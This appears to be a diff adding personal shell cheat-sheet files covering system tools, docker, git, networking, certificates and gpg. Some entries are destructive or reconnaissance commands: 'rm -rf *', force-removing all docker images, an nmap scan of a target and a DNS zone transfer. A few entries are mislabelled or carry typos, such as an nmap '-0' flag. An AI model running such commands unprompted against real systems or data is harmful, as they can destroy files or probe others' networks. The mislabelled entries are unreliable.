+
+# Screenshot: Focused window after X seconds
+scrot -f -d <seconds>
+
+# Screenshot: Select the part of the screen
+scrot -s
+
+# Screenshot: Select the part of the screen, then wait X seconds
+scrot -s -d <seconds>
+
+# Test download/upload network speeds
+speedtest-cli
+
+# Basic, good system info
+neofetch
+
+# Comprehensive system info
+inxi
+
+# Comprehensive battery information
+upower -d
+
+# Show disk usage and allow for deleting stuff
+ncdu
+
+# System monitor - improved "top"
+htop
+
+# System monitoring tool
+glances
+
+# Live system info
+saidar
+
+# Shows all systemd services (root to change status etc.)
+chkservice
+
+# Disk usage overview getting every device possible
+duf --all
+
+# Disk usage overview but disregard special devices
+duf -hide-special
+
+# Disk usage overview (see https://github.com/muesli/duf)
+duf
+
+# Interactive setup of displays
+arandr
+
+# Auto-setup displays
+xrandr --auto
+
+# Text to speech
+espeak
+
+# Ncurses spreadsheet
+sc
+
+# Ncurses git (must be launched from a git repo)
+tig
+
+# Reddit browser
+tuir
+
+
+==> misc__shell.cheat <==
+
+% Shell Usage 
+
+# Re-call last input with sudo
+sudo !!
+
+# Help
+help cd / help dir (...)
+
+# Finding Help
+apropos directory / apropos search (...)
+
+# Define custom startup screen
+sudo nano /etc/motd
+
+# Run a script as background process
+<process> &
+
+#List all running processes
+ps -A
+
+# Kill a running process
+killall <Process-name>
+
+% Shell System
+
+# Get the current path
+pwd
+
+# Get the current hostname
+hostname
+
+# Get the current users
+users
+
+# Show calendar
+cal
+
+# Show today's date
+date
+
+# Exit terminal
+exit
+
+% Shell Permissions
+
+# Use -R option to change permissions recursively.
+ps -ef | grep apache | grep -v grep
+
+# Change group
+chgrp <group-name-from> <group-name-to>
+
+% Shell Directories
+
+# List directory contents
+ls
+
+# List all directory contents
+ll
+
+# List all directory contents sorted by time edited
+ls -alt
+
+# List directory (wildcard matching)
+ls *.<txt>
+
+# List all files of type
+find . -name '*.<txt>' -print
+
+# Go back to previous directory
+cd -
+
+# Make (empty) directory
+mkdir <dirname>
+
+# Remove (empty) directory
+rmdir <dirname>
+
+# Remove directory with all contents without prompt
+rm -rf <dirname>
+
+# Remove directory contents and keep directory
+rm -rf *
+
+# Change directory
+cd <dirname>
+
+% shell Symlinks
+
+# Create symlink
+ln -s <source-dirname> <destination-dirname>
+
+# Update symlink
+ln -sfn <source-dirname> <destination-dirname>
+
+# Remove symlink
+unlink <sample-dirname>
+
+% Shell Files
+
+# Make (empty) file
+touch <filename-txt>
+
+# Duplicate file
+cp <filename> <file-copyname>
+
+# Copy/Page folder with content
+cp -a <old-folder>/ <new-folder>
+
+# Move/Rename file
+mv <current-filename-path> <new-filename-path>
+
+# Move/Rename file and prompt before overwriting an existing file
+mv -i <current-filename> <new-filename>
+
+# Remove file
+rm <filename-txt>
+
+# Write to file (will overwrite existing content)
+cat > <filename-txt> 
+
+# Search for a filename-(not content!) in the current directory
+find <filename-txt>
+
+# Search for a string inside all files in the current directory and subdrectories
+grep -r <string> *
+
+# Search and replace within file
+sed -i s/<original-text>/<new-text>/g <filename-txt>
+
+# MD5 hash for files
+md5 <filename-txt>
+
+# MD5 hash for folders
+tar c <folder> | md5sum
+
+# Encrypt file
+openssl enc -aes-256-cbc -e -in <sample-filename-txt> -out <sample-encrypted-txt>
+
+# Decrypt file
+openssl enc -aes-256-cbc -d -in <sample-encrypted> -out <sample-filename>
+
+% Shell Server
+
+# Access via ssh
+ssh <username_remote>
+
+# Copy file from server to local
+scp <username_remote>:<file-to-send-path> <path-to-recieve> 
+
+# Copy file from local to server
+scp <file-to-send> <username_remote>:<where-to-put>
+
+# Escape files with spaces in name like this
+<path-to-file>\\\ <name-png>
+
+$ username_remote: cat ~/.ssh/config | grep -i "host "|sed 's/^[ \t]*//g' | awk '{print $2}'
+
+% Shell System
+
+# Show disc space
+df -h
+
+# Show disc space (inodes)
+df -i
+
+# Show disc space for current directory
+du -hs
+
+# Current processes (also CPS usage)
+top or htop
+
+# Show running php processes
+ps aux | grep php
+
+# Monitor error log (stream as file grows)
+tail error.log -f -n 0
+
+% Shell Apps
+
+# Start appliction
+xdg-open <programme> 
+
+# Open finder with current folder
+open .
+
+% Shell Variables
+
+# Register variable
+export <TESTING>=<Variable-text>
+
+# Echo variable
+echo $<Variable>
+
+# Unset variable
+unset <Variable>
+
+% Shell Output & Redirects
+
+# Write to file
+echo <Hello> > <hello-txt>
+
+# Append content from a file to another file
+cat <file1-txt> >> <file2-txt>
+
+# Add the amount of lines, words, and characters to <file2-txt>
+cat <file1-txt> | <word-count> | cat > <file2-txt>
+
+# Sort the content of a file (like cat)
+sort <hello-txt>
+
+# Save to sorted content to a new file
+cat <file1-txt> | sort > <sorted-file1-txt>
+
+# Sort and remove duplicates and save to a new file
+sort <file1-txt> | uniq > <uniq-file1-txt>
+
+==> navi__cheats__clipboard.cheat <==
+% clipboard
+
+# Replace line breaks by \n
+dot script clip paste | sed ':a;N;$!ba;s/\n/\\n/g' | dot script clip copy
+
+# Convert uppercase to lowercase
+pbpaste | tr '[:upper:]' '[:lower:]' | pbcopy
+
+# Convert lowercase to uppercase
+pbpaste | tr '[:lower:]' '[:upper:]'  | pbcopy
+==> navi__cheats__docker.cheat <==
+% docker
+
+# Remove an image
+docker image rm <image_id>
+
+# Remove an image from the local image store
+docker rmi <image_id>
+
+# Remove all images from the local image store
+docker images -q | xargs -I% docker rmi "%" --force
+
+# Remove all containers
+docker ps -aq | xargs -I% docker rm "%"
+
+# Stop all containers
+docker ps -aq | xargs -I% docker stop "%"
+
+# List all images that are locally stored with the Docker engine
+docker images
+
+# Build an image from the Dockerfile in the current directory and tag the image
+docker build -t <image>:<version> .
+
+# Pull an image from a registry
+docker pull <image>:<version>
+
+# Stop a running container through SIGTERM
+docker stop <container_id>
+
+# Stop a running container through SIGKILL
+docker kill <container_id>
+
+# List the networks
+docker network ls
+
+# List the running containers
+docker ps
+
+# Delete all running and stopped containers
+docker ps -aq | xargs -I% docker rm -f "%"
+
+# Create a new bash process inside the container and connect it to the terminal
+docker exec -it <container_id> bash
+
+# Print the last lines of a container's logs
+docker logs --tail 100 <container_id> | less
+
+# Print the last lines of a container's logs and following its logs
+docker logs --tail 100 <container_id> -f
+
+# Create new network
+docker network create <network_name>
+
+$ image_id: docker images --- --headers 1 --column 3 --delimiter '\s\s+'
+$ container_id: docker ps --- --headers 1 --column 1 --delimiter '\s\s+'
+
+% docker-compose
+
+# Builds, (re)creates, starts, and attaches to containers for all services
+docker-compose up
+
+# Builds, (re)creates, starts, and dettaches to containers for all services
+docker-compose up -d
+
+# Builds, (re)creates, starts, and attaches to containers for a service
+docker-compose up -d <service_name>
+
+# Builds, (re)creates, starts, and dettaches to containers for a service
+docker-compose up -d <service_name>
+
+# Print the last lines of a service’s logs
+docker-compose logs --tail 100 <service_name> | less
+
+# Print the last lines of a service's logs and following its logs
+docker-compose logs -f --tail 100 <service_name>
+
+# Stops containers and removes containers, networks created by up
+docker-compose down
+
+
+% docker, boot
+
+# Prevent all containers from autostarting on boot
+docker update --restart=no $(docker ps -a -q)
+==> navi__cheats__filesystem.cheat <==
+% fs, filesystem
+
+# Delete all broken symlinks
+find -L . -name . -o -type d -prune -o -type l -exec rm {} +
+
+# Delete all .DS_Store files
+find . -name ".DS_Store" -type f -delete
+
+# Delete empty directories
+find . -type d -empty -delete
+
+# Folder size
+du -sh
+
+# Edit fre entries
+e "${HOME}/Library/Application Support/fre/fre.json"
+
+==> navi__cheats__git.cheat <==
+% git common
+; raycast.icon: bank-note-16
+
+$ local_branch: dot git ls local_branch --- --column 1
+$ config: dot git ls config --- --column 1
+$ stash: dot git ls stash --- --column 1
+$ commit: dot git ls commit --- --column 1
+$ toplevel_dir: dot git ls toplevel_dir
+$ file: dot git ls file --- --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ files: dot git ls file --- --multi --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ modified_file: dot git ls file -m --- --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ modified_files: dot git ls file -m --- --multi --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ tag: dot git ls tag --- --column 1
+$ upstream_branch: dot git branch upstream
+$ modified_files_upstream: git diff --name-only "<upstream_branch>" --- --multi --preview 'bat -p --color=always {}' --map "sed -e 's/^.*$/\"&\"/' | tr '\n' ' '"
+
+% git branch
+@ git common
+
+# checkout branch
+git checkout "<local_branch>"
+
+# checkout tag
+git checkout "<tag>"
+
+# set upstream
+git branch —set-upstream-to "<local_branch>"
+
+% git config
+@ git common
+
+# print config value
+git config "<config>"
+
+% git view
+@ git common
+
+# view
+bat --color=always "<file>"
+
+% git add
+@ git common
+
+# add files
+cd "<toplevel_dir>"
+files=($(echo "<modified_files>"))
+git add "${files[@]}"
+git status
+
+% git misc
+@ git common
+
+# revert (checkout) files to upstream version
+for f in <modified_files_upstream>; do git checkout "<upstream_branch>" "$f"; done
+==> navi__cheats__network.cheat <==
+% network
+
+# Kill a process running on a given port
+lsof -i :<port> \
+   | awk '{l=$2} END {print l}' \
+   | xargs kill
+
+# Kill a process using a port given a name
+port="$(echo "<process>" | grep -Eo ':([0-9][0-9][0-9]+) ' | tr -d ':')"
+lsof -i :$port \
+   | awk '{l=$2} END {print l}' \
+   | xargs kill
+
+# List IP addresses connected on a given port
+netstat -tn 2>/dev/null \
+   | grep :<port> \
+   | awk '{print $5}' \
+   | cut -d: -f1 \
+   | sort \
+   | uniq -c \
+   | sort -nr \
+   | head
+
+# Find external, public IP address
+dig +short myip.opendns.com @resolver1.opendns.com
+
+# Find primary, local IP address
+ifconfig \
+  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' \
+  | grep -Eo '([0-9]*\.){3}[0-9]*' \
+  | grep -v '127.0.0.1' \
+  | tail -n1
+
+# Geolocation data given an IP
+curl -sL "ipinfo.io/<ip>" | jq
+
+# Geolocation data for own IP
+curl -sL "ipinfo.io/<self_global_ip>" | jq
+
+# Launch a container with network utils
+docker run -it --entrypoint /bin/sh nicolaka/netshoot
+
+# Map ports
+sudo nmap -sS -sV -0 "<target>"
+
+# Find process using a port
+lsof -n -i4TCP:<port> | grep LISTEN
+
+# List open ports
+lsof -Pn -i4
+
+# Start a Python3 server
+python3 -m http.server
+
+$ self_global_ip: dig +short myip.opendns.com @resolver1.opendns.com
+$ process: lsof -iTCP -sTCP:LISTEN -n -P | sed -E "s/:([0-9][0-9][0-9]+) /:$(tput setaf 3)\1$(tput sgr0) /g" --- --header-lines 1
+==> navi__cheats__process.cheat <==
+% process
+
+# Kill with signal 9
+sudo kill -9 <pid>
+
+# Kill with signal <n>
+sudo kill -<n> <pid>
+
+# Limit CPU usage to <n>%
+cpulimit --include-children --limit <n> --pid <pid>
+
+# Stop limiting CPU
+pkill -f cpulimit.*<pid>
+
+# Lower priority by <n>
+renice -n <n> -p <pid>
+
+# Unfreeze process
+kill -CONT <pid>
+
+$ pid: (ps -o pid,%cpu,%mem,ni,cmd ax 2>/dev/null || ps -o pid,%cpu,%mem,ni,command) | sort -b -k3 -r | awk '{print $1, $2, $3, $4, $5}' | column -t --- --header-lines 1 --column 1
+==> navi__cheats__shell.cheat <==
+% shell
+
+# Copy environment variable to clipboard
+echo "<env_var_value>" | dot script clip copy
+
+# List path available commands
+which "<cmd>"
+
+$ cmd: bash -c "compgen -c" | sort -u
+$ env_var_value: echo -e "variable@value\n$(env)" | sed 's/=/@/' | column -t -s'@' -c2 --- --column 2 --header-lines 1
+==> navi__cheats__tmp.cheat <==
+% examples
+
+# Simple echo
+echo foo bar
+
+# Display contents of a file
+cat <file>
+
+# Echo text
+echo <some_text>
+
+$file: ls
+
+
+# Send WhatsApp message to phone number
+open 'https://web.whatsapp.com/send?phone=<phone>'
+
+
+% tmp
+
+# Echo multiline
+echo -e "<foo>\nlorem ipsum\n<bar>"
+
+$ foo: ls
+$ bar: ls
+
+% rg, grep
+
+# search 1
+rg <opts1> <pattern> <path>
+
+# search 2
+rg <opts2> <pattern> <path>
+
+# make install path
+echo make DESTDIR=<dst> install
+
+$ dst: echo "$HOME" --- --fzf-overrides '--no-select-1'
+$ opts1: echo -e 'option;description\n--column;show column numbers\n-l;print filenames with maches\n--files-without-match;print filenames without matches' | column -t -s';' --- --column 1 --header-lines 1 --multi --map "tr '\n' ' '"
+$ opts2: echo -e 'option;description\n--column;show column numbers\n-l;print filenames with maches\n--files-without-match;print filenames without matches' | column -t -s';' --- --column 1 --header-lines 1 --multi --map "tr c f"
+
+% slow
+
+# Slow command
+echo <a> <b>
+
+$ a: printf 'Loading...' >&2; sleep 2; printf '%b' '\r\033[2K' >&2; echo "a c" | tr ' ' '\n'
+$ b: sleep 2 && echo "b d" | tr ' ' '\n'
+
+% table
+
+# my make command
+echo make <cfg>
+
+$ cfg: for x in 1 2 3; do \
+   for y in a b c; do \
+      echo "$x $y"; \
+   done; \
+  done \
+  --- --expand --prevent-extra
+
+% shell
+
+# env
+cat ${HOME}/dotfiles/shell/bash/bashrc | wc
+echoerr foo
+
+% err
+
+# check for error
+log="<log>"
+if [ -n "$log" ]; then
+   echo "my git log has <words> words"
+else
+   echo "failed to get git log"
+fi
+
+$ log: echo "foo bar"
+$ words: echo "$log" | wc -w | xargs
+
+
+% empty
+
+# empty test
+tar -xf <file>
+
+$ file: ls *.tar
+
+% default
+
+# default test
+echo "<n>"
+
+$ n: echo -e "16\n"
+
+% src
+
+# This will output "foo\nyes"
+echo foo
+true \
+    && echo yes `# comment 1` \
+    || echo no `# comment 2`
+
+# echoerr
+source "${HOME}/dotfiles/shell/aux/core.bash"
+echoerr foo
+
+% headphone, sound
+
+# play a sound
+afplay "/Applications/Slack.app/Contents/Resources/b2.mp3"
+
+==> network__curl.cheat <==
+% curl, http
+
+# send a get http request
+curl <url>
+
+# send a http request
+curl -X <method> <url>
+
+# send a http request and write the output to a file
+curl -X <method> <url> -o <filename>
+
+# send a get http request and follow redirects
+curl -L <url>
+
+# send a get http request exit with a non-zero status code on failure
+curl --fail <url>
+
+# send an authenticated http request
+curl -u <username>:<password> -X <method> <url>
+
+# send a http request with a json body
+curl -X <method> <url>  -H 'Content-Type: application/json' -d '<json>'
+
+# send a http request with a form body
+curl <url> -d <bodykey>=<bodyvalue>
+
+# send a http request and see the request as well as the response
+curl -v <url>
+
+# send a http request with a body from a file
+curl -X <method> <url> --data-binary "@<file>"
+
+# send a http request with a custom header
+curl -X <method> <url> -H "<headername>: <headervalue>"
+
+$ file: ls
+$ method: echo -e 'GET\nPOST\nPUT\nDELETE\nPATCH'
+
+==> networking__dig.cheat <==
+% dnsm networking
+
+# Query Specific Name Server
+
+dig @<dns_Server_v4> <fqdn>
+
+$ dns_server_v4: echo -e "8.8.8.8\n "
+$ dns_server_v6: echo -e "2001:4860:4860::8888\n "
+
+# Search For Record Type
+
+dig @<dns_Server> <fqdn> <dns_record_type>
+
+$ dns_record_type: echo -e "ALL\nA\nMX\nTXT\n "
+
+# Reverse DNS Lookup
+
+dig -x <ip_address>
+
+# Trace DNS Path
+
+dig <fqdn> +trace
+
+# Adjust Answer Size of dig
+
+dig <fqdn> +short
+
+# Lookup From File
+
+dig -f <dns_query_file> +short
+
+# Specify Port Number
+
+dig @<dns_Server_v4> -p <port> <fqdn>
+
+# Use IPv4 Or IPv6
+
+dig -6 @<dns_Server_v6> <fqdn> <dns_record_type>
+
+# Query All DNS Record Types
+
+dig <fqdn> ANY
+
+# Customize Dig Output - Hide All
+
+dig <fqdn> +noall
+
+# Customize Dig Output - Print Statistics
+
+dig <fqdn> +noall +stats
+
+# Customize Dig Output - Print Answer
+
+dig <fqdn> +noall +answer
+
+# Get a list of all subdomains of a domain
+
+dig @<dns_Server_v4 <fqdn> axfr
+
+# Adjust Defaults With ~/.digrc File
+
+cat ~/.digrc
+
+# TCP mode
+
+dig <fqdn> +[no]vc
+
+# TCP mode, alternate syntax
+
+dig <fqdn> +[no]tcp
+
+# Set query timeout [5]
+
+dig <fqdn> +time=<query_time>
+
+# Set number of UDP attempts [3]
+
+dig <fqdn> +tries=<query_tries>
+
+# Set number of UDP retries [2]
+
+dig <fqdn> +retry=<query_retries>
+
+# Set default domainname
+
+dig <fqdn> +domain=<domain_name>
+
+# Set EDNS0 Max UDP packet size
+
+dig <fqdn> +bufsize=<bufsize>
+
+# Set NDOTS value
+
+dig <fqdn> +ndots=<ndots>
+
+# Set EDNS version
+
+dig <fqdn> +edns=<edns_version>
+
+# Set whether to use searchlist
+
+dig <fqdn> +[no]search
+
+# Search with intermediate results
+
+dig <fqdn> +[no]showsearch
+
+# Ditto
+
+dig <fqdn> +[no]defname
+
+# Recursive mode
+
+dig <fqdn> +[no]recurse
+
+# Don’t revert to TCP for TC responses.
+
+dig <fqdn> +[no]ignore
+
+# Don’t try next server on SERVFAIL
+
+dig <fqdn> +[no]fail
+
+# Try to parse even illegal messages
+
+dig <fqdn> +[no]besteffort
+
+# Set AA flag in query dig <fqdn> +[no]aaflag
+
+dig <fqdn> +[no]aaonly
+
+# Set AD flag in query
+
+dig <fqdn> +[no]adflag
+
+# Set CD flag in query
+
+dig <fqdn> +[no]cdflag
+
+# Control display of class in records
+
+dig <fqdn> +[no]cl
+
+# Control display of command line
+
+dig <fqdn> +[no]cmd
+
+# Control display of comment lines
+
+dig <fqdn> +[no]comments
+
+# Control display of question
+
+dig <fqdn> +[no]question
+
+# Control display of answer
+
+dig <fqdn> +[no]answer
+
+# Control display of authority
+
+dig <fqdn> +[no]authority
+
+# Control display of additional
+
+dig <fqdn> +[no]additional
+
+# Control display of statistics
+
+dig <fqdn> +[no]stats
+
+# Disable everything except shortform of answer
+
+dig <fqdn> +[no]short
+
+# Control display of ttls in records
+
+dig <fqdn> +[no]ttlid
+
+# Set or clear all display flags
+
+dig <fqdn> +[no]all
+
+# Print question before sending
+
+dig <fqdn> +[no]qr
+
+# Search all authoritative nameservers
+
+dig <fqdn> +[no]nssearch
+
+# ID responders in short answers
+
+dig <fqdn> +[no]identify
+
+# Trace delegation down from root
+
+dig <fqdn> +[no]trace
+
+# Request DNSSEC records
+
+dig <fqdn> +[no]dnssec
+
+# Request Name Server ID
+
+dig <fqdn> +[no]nsid
+
+# Print records in an expanded format
+
+dig <fqdn> +[no]multiline
+
+# AXFR prints only one soa record
+
+dig <fqdn> +[no]onesoa
+==> networking__ss.cheat <==
+% ss, socket statistics, network
+
+# Summary of socket connections (all connections, show port and service number, incl. process names)
+ss -plants
+
+# Show TCP/UDP and related process
+ss -plunt
+
+# close active connections. It works for IPv4 and IPv6 and can be used with the --kill option. Typically you want to combine this with a specific IP address and optionally a port.
+ss --kill dst <ip address> dport = <port>
+
+# monitor connections ( see the amount of traffic and great for monitoring or when to do system maintenance)
+ss -n --events
+
+# open connections on a port
+ss -nt sport = :<port>
+
+# Query multiple ports
+ss -nt '( sport = :<port 1> or sport = :<port 2> )'
+
+# Connection by defining the side ‘src’ (source) or ‘dst’ (destination)
+
+ss -nt '( src :<port 1> or src :<port 2> )'
+==> networking__ssh.cheat <==
+% ssh
+
+# See the available SSH keys in the OpenSSH authentication agent
+ssh-add -l
+==> networking__ssl.cheat <==
+% openssl, ssl, networking
+
+# Show expiration date of SSL certificates
+echo | openssl s_client -connect <domain>:<port> 2>/dev/null |openssl x509 -dates -noout
+
+$ port: echo -e "443\n "
+
+# Making and trusting your own certificates
+openssl req -x509 -out <localdomain>>.crt -keyout <localdomain>.key \
+  -newkey rsa:2048 -nodes -sha256 \
+  -subj "/CN=<localdomain>" -extensions EXT -config <( \
+   printf "[dn]\nCN=<localdomain>\n[req]\ndistinguished_name = dn\n[EXT]\nsubjectAltName=DNS:<localdomain>\nkeyUsage=digitalSignature\nextendedKeyUsage=serverAuth")
+==> obsidian.cheat <==
+% obsidian, obsidian-cli
+
+# Defines default vault for future usage. If not set, pass --vault flag for other commands. You don't provide the path to vault here, just the name.
+obs set-default "{vault-name}"
+
+# Prints default vault and path. Please set this with set-default command if not set.
+obs print-default
+
+# Opens note in obsidian
+obs open "{note-name}"
+
+# Opens note in specified obsidian
+obs open "{note-name}" --vault "{vault-name}"
+
+# Searches in default obsidian
+obs search "{search-text}"
+
+# Searches in specified obsidian
+obs search "{search-text}" --vault "{vault-name}"
+
+# Creates empty note in default obsidian and opens it
+obs create "{note-name}"
+
+# Creates empty note in given obsidian and opens it
+obs create "{note-name}"  --vault "{vault-name}"
+
+# Creates note in default obsidian with content
+obs create "{note-name}" --content "abcde"
+
+# Creates note in default obsidian with content - overwrite existing note
+obs create "{note-name}" --content "abcde" --overwrite
+
+# Creates note in default obsidian with content - append existing note
+obs create "{note-name}" --content "abcde" --append
+
+# Creates note and opens it
+obs create "{note-name}" --content "abcde" --open
+
+# Renames a note in default obsidian
+obs move "{current-note-path}" "{new-note-path}"
+
+# Renames a note and given obsidian
+obs move "{current-note-path}" "{new-note-path}" --vault "{vault-name}"
+
+# Renames a note in default obsidian and opens it
+obs move "{current-note-path}" "{new-note-path}" --open
+
+# Renames a note in default obsidian
+obs delete "{note-path}" 
+
+# Renames a note in given obsidian
+obs delete "{note-path}" --vault "{vault-name}"
+
+==> openssl.cheat <==
+% openssl
+
+# Download certificat from server
+echo | \
+openssl s_client -servername <DOMAIN> -connect <DOMAIN>:443 2>/dev/null | \
+openssl x509 -text | \
+less
+
+
+==> rsync.cheat <==
+% rsync
+
+# files from server (accepts * and regular expressions)
+rsync -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special port (accepts * and regular expressions)
+rsync -e 'ssh -p <port>' -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special port and special key (accepts * and regular expressions)
+rsync -e 'ssh -p <port> -i <sshkey>' -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special key (accepts * and regular expressions)
+rsync -e 'ssh -i <sshkey>' -avzPs '<user>@<server>:<folder>/*' .
+
+$ user : echo -e "$(whoami)\nroot"
+$ sshkey : ls ~/.ssh | grep -v known_hosts | grep -v config
+$ server : cat /etc/hosts | cut -f2 -d' '
+
+==> rust__packages.cheat <==
+% rust packages, utilities, cli, shell, package manager, updates
+
+# Update all currently installed cargo packages
+
+cargo install-update --all
+
+==> security__gpg.cheat <==
+% gpg
+
+# gpg version
+gpg --version
+
+# gpg generate key
+gpg --gen-key
+
+# list keys
+gpg --list-keys
+
+# distribute public key to key server
+gpg --keyserver <key_server> --send-keys <public_key>
+
+# export public key
+gpg --output <filename_gpg> --export <key_name>
+
+# import public key
+gpg --import <filename_gpg>
+
+# encrypt document
+gpg --output <output_filename_gpg> --encrypt --recipient <public_key> <input_filename>
+
+# decrypt document
+gpg --output <filename> --decrypt <filename_gpg>
+
+# make a signature
+gpg --output <filename_sig> --sign <filename>
+
+# verify signature
+gpg --output <filename> <filename> --decrypt <filename_sig>
+
+# clearsign documents
+gpg --clearsign <filename>
+
+# detach signature
+gpg --output <filename_sig> --detach-sig <filename>
+
+==> security__keytool.cheat <==
+% java keytool, certificate, encryption
+
+## Creating
+# Generate a Java keystore and key pair
+keytool -genkey -alias <ALIAS> -keyalg RSA -keystore <OUTPUT_JKS> -keysize <RSA_LENGTH>
+
+# Generate a certificate signing request (CSR) for an existing Java keystore
+keytool -certreq -alias <ALIAS> -keystore <INPUT_JKS> -file <OUTPUT_CSR>
+
+# Import a root or intermediate CA certificate to an existing Java keystore
+keytool -import -trustcacerts -alias root -file <INPUT_CRT> -keystore <INPUT_JKS>
+
+# Import a signed primary certificate to an existing Java keystore
+keytool -import -trustcacerts -alias <ALIAS> -file <INPUT_CRT> -keystore <INPUT_JKS>
+
+# Generate a keystore and self-signed certificate
+keytool -genkey -keyalg RSA -alias <ALIAS> -keystore <OUTPUT_JKS> -storepass <PASSWORD> -validity <VALIDITY> -keysize <RSA_LENGTH>
+
+
+
+## Verifying
+# Check a stand-alone certificate
+keytool -printcert -v -file <INPUT_CRT>
+
+# Check which certificates are in a Java keystore
+keytool -list -v -keystore <INPUT_JKS>
+
+# Check a particular keystore entry using an alias
+keytool -list -v -keystore <INPUT_JKS> -alias <ALIAS>
+
+
+
+## Other
+# Remove a certificate from a keystore
+keytool -delete -alias <ALIAS> -keystore <INPUT_JKS>
+
+# Change the password of a keystore
+keytool -storepasswd -keystore <INPUT_JKS> -new <NEW_PASSWORD>
+
+# Export a certificate from a keystore
+keytool -export -alias <ALIAS> -file <OUTPUT_CRT> -keystore <INPUT_JKS>
+
+# List the trusted CA Certs from the default Java Trusted Certs Keystore
+keytool -list -v -keystore $JAVA_HOME/jre/lib/security/cacerts
+
+# Import New Certificate Authority into the default Java Trusted Certs Keystore
+keytool -import -trustcacerts -file <INPUT_PEM> -alias <ALIAS> -keystore $JAVA_HOME/jre/lib/security/cacerts
+
+
+
+# Sensible/common default alternatives
+$ VALIDITY: printf "DAYS\tCOMMENT\n1\ta day\n30\ta month\n365\ta year\n730\ttwo years" --- --column 1 --headers 1
+$ RSA_LENGTH: printf "KEY LENGTH\tCOMMENT\n2048\t\tDefault\n4096\t\tBetter\n8192\t\tSlow?" --- --column 1 --headers 1
+
+# Attempt to find files with the appropriate endings, default to everything.
+$ INPUT_CRT:    ls -a | grep -e "\(.crt\|.cer\|.der\)" || ls -a
+$ INPUT_PEM:    ls -a | grep -e "\(.pem\)"             || ls -a
+$ INPUT_JKS:    ls -a | grep -e "\(.jks\)"             || ls -a
+
+==> security__openssl.cheat <==
+% openssl, certificate, encryption
+
+## General OpenSSL Commands
+# Create a new signing request and key
+openssl req -new -newkey rsa:<RSA_LENGTH> -nodes -out <OUTPUT_CSR> -keyout <OUTPUT_KEY>
+
+# Create a new self-signed certificate
+openssl req -x509 -sha256 -nodes -days <VALIDITY> -newkey rsa:<RSA_LENGTH> -out <OUTPUT_CRT> -keyout <OUTPUT_KEY>
+
+# Create a signing request from existing key
+openssl req -out <OUTPUT_CSR> -key <INPUT_KEY> -new
+
+# Create a signing request from existing certificate and key
+openssl x509 -x509toreq -out <OUTPUT_CSR> -in <INPUT_CRT> -signkey <INPUT_KEY>
+
+# Remove a passphrase from a private key
+openssl rsa -in <INPUT_KEY> -out <OUTPUT_PLAINTEXT_KEY>
+
+
+
+## Converting between the different encoding
+# Convert a DER encoded file to a PEM encoded file
+openssl x509 -inform der -in <INPUT_CRT> -out <OUTPUT_PEM>
+
+# Convert a PEM encoded file to a DER encoded file
+openssl x509 -outform der -in <INPUT_PEM> -out <OUTPUT_CRT>
+
+# Convert a PKCS12 encoded file containing a private key and certificates to PEM
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes
+
+# Extract the private key from a PKCS12 encoded file
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nocerts
+
+# Extract the certificate from a PKCS12 encoded file
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nokeys
+
+# Convert a PEM certificate file and a private key to PKCS12 encoded file
+openssl pkcs12 -export -out <OUTPUT_PKCS12> -inkey <INPUT_KEY> -in <INPUT_CRT> -certfile <INPUT_CRT>
+
+
+
+## Validating certificates and keys using OpenSSL
+# Validate a certificate signing request
+openssl req -text -noout -verify -in <OUTPUT_CSR>
+
+# Validate a private key
+openssl rsa -in <INPUT_KEY> -check
+
+# Validate a certificate
+openssl x509 -in <INPUT_CRT> -text -noout
+
+# Validate a PKCS12 file (.pfx or .p12)
+openssl pkcs12 -info -in <INPUT_PKCS12>
+
+
+
+## Debugging using OpenSSL
+# Compare the MD5 hash of a certificate
+openssl x509 -noout -modulus -in <INPUT_CRT> | openssl md5
+
+# Compare the MD5 hash of a private key
+openssl rsa -noout -modulus -in <INPUT_KEY> | openssl md5
+
+# Compare the MD5 hash of a certificate signing request
+openssl req -noout -modulus -in <INPUT_CSR> | openssl md5
+
+# Display the server certificate chain
+openssl s_client -connect <URL>:<PORT>
+
+
+
+# Sensible/common default alternatives
+$ VALIDITY: printf "DAYS\tCOMMENT\n1\ta day\n30\ta month\n365\ta year\n730\ttwo years" --- --column 1 --headers 1
+$ RSA_LENGTH: printf "KEY LENGTH\tCOMMENT\n2048\t\tDefault\n4096\t\tBetter\n8192\t\tSlow?" --- --column 1 --headers 1
+
+# Attempt to find files with the appropriate endings, default to everything.
+$ INPUT_PKCS12: ls -a | grep -e "\(.pfx\|.p12\)"       || ls -a
+$ INPUT_CSR:    ls -a | grep -e "\(.csr\)"             || ls -a
+$ INPUT_KEY:    ls -a | grep -e "\(.key\|.pem\)"       || ls -a
+$ INPUT_CRT:    ls -a | grep -e "\(.crt\|.cer\|.der\)" || ls -a
+$ INPUT_PEM:    ls -a | grep -e "\(.pem\)"             || ls -a
+
+==> security__ssh.cheat <==
+% ssh
+
+# Start ssh agent
+eval "$(ssh-agent -s)"; ssh-add
+
+==> shell__colors.cheat <==
+% ansi terminal colors, bash, shell, cli
+
+# Ansi tput syntax for reset
+
+RESET=$'\033[0m'
+
+# Ansi tput method for Foreground Black
+
+$(tput setaf 0)
+
+# Ansi tput method for Foreground Light Black
+
+$(tput setaf 8)
+
+# Ansi tput method for Foreground Red
+
+$(tput setaf 1)
+
+# Ansi tput method for Foreground Light Red
+
+$(tput setaf 9)
+
+# Ansi tput method for Foreground Light Green
+
+$(tput setaf 2)
+
+# Ansi tput method for Foreground Light Green
+
+$(tput setaf 10)
+
+# Ansi tput method for Foreground Yellow
+
+$(tput setaf 3)
+
+# Ansi tput method for Foreground Light Yellow
+
+$(tput setaf 11)
+
+# Ansi tput method for Foreground Blue
+
+$(tput setaf 4)
+
+# Ansi tput method for Foreground Light Blue
+
+$(tput setaf 12)
+
+# Ansi tput method for Foreground Magenta
+
+$(tput setaf 5)
+
+# Ansi tput method for Foreground Light Magenta
+
+$(tput setaf 13)
+
+# Ansi tput method for Foreground Cyan
+
